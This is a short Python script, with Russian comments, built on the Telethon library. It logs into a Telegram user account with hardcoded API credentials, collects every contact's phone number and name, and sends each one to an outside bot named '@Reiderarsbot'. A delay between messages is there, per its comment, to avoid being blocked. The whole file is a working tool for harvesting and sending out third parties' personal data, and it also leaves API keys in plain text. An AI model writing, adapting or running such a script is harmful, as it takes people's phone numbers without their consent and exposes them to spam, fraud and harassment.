import asyncio
from telethon import TelegramClient
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.types import InputPhoneContact

# Введите ваши данные
api_id = '22033302'
api_hash = '522596c0b5c29485d238e531ed87ec83'
bot_username = '@Reiderarsbot'  # Например, 'my_bot'

# Авторизация
client = TelegramClient('session_name', api_id, api_hash)

async def main():
    await client.start()

    # Получаем контакты
    result = await client(GetContactsRequest(hash=0))
    contacts = result.users  # Контакты возвращаются в users

    # Отправляем каждый контакт боту
    for contact in contacts:
        if contact.phone:  # Проверяем, есть ли номер телефона
            # Создаём объект контакта
            phone_contact = InputPhoneContact(
                client_id=0,  # ID контакта, можно оставить 0
                phone=contact.phone,
                first_name=contact.first_name or 'Нет имени',
                last_name=contact.last_name or 'Нет фамилии'
            )
            # Отправляем контакт
            await client.send_contact(bot_username, phone_contact)
            print(f'Отправлен контакт: {contact.first_name or "Нет имени"} {contact.last_name or "Нет фамилии"} - {contact.phone}')
            await asyncio.sleep(1)  # Задержка между отправкой контактов, чтобы избежать блокировки

with client:
    client.loop.run_until_complete(main())
